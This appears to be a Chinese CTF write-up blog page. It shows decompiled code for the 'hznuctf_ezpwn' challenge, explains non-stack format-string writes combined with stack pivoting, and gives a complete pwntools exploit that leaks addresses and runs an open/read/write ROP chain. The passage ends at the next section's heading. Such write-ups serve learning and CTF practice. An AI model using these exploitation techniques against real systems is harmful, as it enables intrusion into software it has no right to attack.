@@ -1,0 +1,1729 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="nyyyddddn">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="nyyyddddn">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="非栈上格式化字符串套orwhznuctf_ezpwn 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  sand_box(arg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="奇奇怪怪格式化字符串漏洞的利用1">
+<meta property="og:url" content="https://nyyyddddn.github.io/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/index.html">
+<meta property="og:site_name" content="nyyyddddn">
+<meta property="og:description" content="非栈上格式化字符串套orwhznuctf_ezpwn 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  sand_box(arg">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-21T17:11:30.000Z">
+<meta property="article:modified_time" content="2024-08-21T17:12:05.824Z">
+<meta property="article:author" content="nyyyddddn">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/null">
+    
+    <title>奇奇怪怪格式化字符串漏洞的利用1 · nyyyddddn&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>nyyyddddn</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">nyyyddddn</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">奇奇怪怪格式化字符串漏洞的利用1</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                奇奇怪怪格式化字符串漏洞的利用1
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="misc">misc</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/08/22</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="非栈上格式化字符串套orw"><a href="#非栈上格式化字符串套orw" class="headerlink" title="非栈上格式化字符串套orw"></a>非栈上格式化字符串套orw</h2><p>hznuctf_ezpwn</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  sand_box(argc, argv, envp);</span><br><span class="line">  rand_time();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rand_time</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> seed; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;welcome to HZNUCTF !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I wonder if you&#x27;re lucky enough&quot;</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s guess the number: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;seed);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != seed )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Guess you weren&#x27;t lucky enough.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Right.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;WOW you really a lucky guy!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Then I want to know if you are capable enough.&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell us something: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s1, <span class="number">0x80</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;HZNUCTF&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>非栈上格式化字符串相对栈上格式化字符串 最麻烦的地方是任意地址写需要通过一个指针去调整另一个指针，一个字节或者是两个字节的写数据，需要两个步骤，有orw的情况下(不考虑这个沙箱能escape的情况)如果能正常退出循环，可以配合栈迁移的方式，把栈迁移到输入地址那进行rop，然后还可以通过二次迁移迁移到已知的地址来做更复杂的操作</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line">IP = <span class="string">&quot;150.158.117.224&quot;</span></span><br><span class="line">PORT = <span class="number">20042</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">cdll=ctypes.CDLL(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x20</span>)</span><br><span class="line">sa(<span class="string">&quot;Please input your name: &quot;</span>,payload)</span><br><span class="line">cdll.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	payload=cdll.rand()</span><br><span class="line">	sla(<span class="string">&quot;Let&#x27;s guess the number: &quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%6$p%7$p%9$p&quot;</span>+<span class="string">b&quot;HZNUCTF\x00&quot;</span></span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&quot;rbp-&gt;<span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&quot;</span>)</span><br><span class="line">leek_main=<span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)</span><br><span class="line">main=leek_main-<span class="number">38</span></span><br><span class="line">log.success(<span class="string">f&quot;main-&gt;<span class="subst">&#123;<span class="built_in">hex</span>(main)&#125;</span>&quot;</span>)</span><br><span class="line">pie=main-<span class="number">0x14df</span></span><br><span class="line">log.success(<span class="string">f&quot;pie-&gt;<span class="subst">&#123;<span class="built_in">hex</span>(pie)&#125;</span>&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base-&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">bss=pie+<span class="number">0x4060</span></span><br><span class="line">leave_ret=pie+<span class="number">0x1369</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(stack&amp;<span class="number">0xffff</span>)-<span class="number">0x8</span>&#125;</span>c%11$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(leave_ret&amp;<span class="number">0xffff</span>)&#125;</span>c%39$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(stack&amp;<span class="number">0xffff</span>)+<span class="number">0x28</span>&#125;</span>c%11$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(bss&amp;<span class="number">0xffff</span>)&#125;</span>c%39$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(stack&amp;<span class="number">0xffff</span>)+<span class="number">0x30</span>&#125;</span>c%11$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(leave_ret&amp;<span class="number">0xffff</span>)&#125;</span>c%39$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(stack&amp;<span class="number">0xffff</span>)-<span class="number">0x10</span>&#125;</span>c%11$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line">payload=<span class="string">f&quot;%<span class="subst">&#123;(stack&amp;<span class="number">0xffff</span>)+<span class="number">0x28</span>&#125;</span>c%39$hnHZNUCTF\x00&quot;</span>.encode()</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rdi=pie+<span class="number">0x1573</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x15fae6</span></span><br><span class="line">flag=bss+<span class="number">0xe0</span></span><br><span class="line">buf=bss+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;HZNUCTF\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss+<span class="number">0x48</span>) + p64(pop_rdx) + p64(<span class="number">0x110</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read)</span><br><span class="line">sa(<span class="string">&quot;Please tell us something: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi) + p64(flag) + p64(<span class="built_in">open</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read) </span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(write)+<span class="string">b&quot;./flag\x00&quot;</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3个字节格式化字符串泄露libc"><a href="#3个字节格式化字符串泄露libc" class="headerlink" title="3个字节格式化字符串泄露libc"></a>3个字节格式化字符串泄露libc</h2><p>corctf_format-string</p>
+<p>source.c</p>
